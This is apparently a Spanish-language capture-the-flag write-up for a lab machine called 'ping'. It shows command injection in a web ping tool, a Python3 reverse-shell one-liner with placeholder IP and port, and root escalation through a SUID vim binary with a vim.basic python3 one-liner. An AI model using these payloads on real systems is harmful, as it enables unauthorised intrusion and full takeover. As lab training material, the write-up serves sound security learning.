Para la fase de reconocimiento inicial utilicé un script que diseñé que me permite el escaneo de puertos, servicios, directorios web, y algunas vulnerabilidades conocidas de manera automatizada.
Pueden encontrar esta herramienta en mi perfil de Github.

![img2](/secnotes/assets/img/ping/escaneo1.png)

Este script nos muestra la siguiente información:

![img3](/secnotes/assets/img/ping/escaneo2.png)

Al acceder al servicio web desde el navegador, nos encontramos con una herramienta de Ping

![img4](/secnotes/assets/img/ping/web.png)

![img5](/secnotes/assets/img/ping/web1.png)

Después de realizar la prueba sugerida en la herramienta, podemos notar algo..
si una web recibe un parámetro que parece un comando del sistema y devuelve una salida de consola, podemos asumir que  la web es vulnerable a Command Injection hasta que se demuestre lo contrario. 
Así que realizamos una prueba simple lanzando algún comando del sistema.

![img6](/secnotes/assets/img/ping/rce.png)

Para confirmar esta vulnerabilidad, se inyectó un separador de comandos (;) seguido del comando id.
El servidor nos devolvió la salida del comando ejecutado con los privilegios del usuario del servidor web (www-data).

Ya que podemos realizar la ejecución de comandos, podemos intentar la conexión al servidor mediante una reverse shell. Para esto primero debemos saber que reverse shell podemos elegir.
El primer paso será elegir un interprete disponible en el sistema. Así que, con el comando `which` buscaremos una shell disponible (bash, sh, python, python3, perl, nc)

 ![img7](/secnotes/assets/img/ping/shell.png)
 
 Una vez lanzando el comando, vemos que tenemos varias shell disponibles para utilizar.
 
`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`

Para ejecutar nuestra reverse shell, pegaremos el código después del separador que utilizamos en el momento de confirmar el RCE
 
 ![img8](/secnotes/assets/img/ping/rshell.png)
 
 
 ![img9](/secnotes/assets/img/ping/rshell1.png)
 
 Al ejecutar obtenemos la conexión al servidor.

 Una vez dentro del sistema debemos buscar algún permiso que nos permita la escalada de privilegios. Hay varias formas de hacer esto. En este caso no nos funcionó `sudo -l` así que buscaremos con el comando ingresado. 
 
 ![img10](/secnotes/assets/img/ping/perm.png)
  
Luego de esta búsqueda, vemos que vim tiene permisos especiales (s) lo que significa que cualquier usuario que puede lanzar vim como usuario root 
 
  ![img11](/secnotes/assets/img/ping/vim.png)
  
  ![img12](/secnotes/assets/img/ping/vim1.png)
  
  dice que si tenemos el SUID podemos ejecutar comandos heredados.  
  
  Sabiendo esto, luego de una investigación y con ayuda de la IA generamos un codigo que nos ayudará a escalar privilegios
  
 `vim.basic -c ':python3 import os, pty; os.setuid(0); pty.spawn("/bin/bash")' 
 
 **vamos a entender este comando** 
 
 vim.basic -c ‘COMANDO’= indica a vim que ejecute el comando automaticamente al abrir
 
:python3 = ejecuta el codigo en python3, el codigo corre dentro del proceso de vim y hereda el EUID=0 (por el SUID de vim)

import os, pty = permite interactuar con el sistema operativo, pty permite crear pseudo-terminales (necesario para tener una shell interactiva)

os.setuid(0) = cambia el UID real del proceso a 0 (root), esto funciona por que vim tiene el permiso especial  SUID

pty.spawn("/bin/bash") = lanza /bin/bash, lo ata a la psudo terminal creada, nos da una shell interactiva real (permite usar Ctrl+C, tab, comandos interactivos y estabilidad)

al lanzar este comando automáticamente nos convertimos en usuarios root


![img13](/secnotes/assets/img/ping/root.png)
 
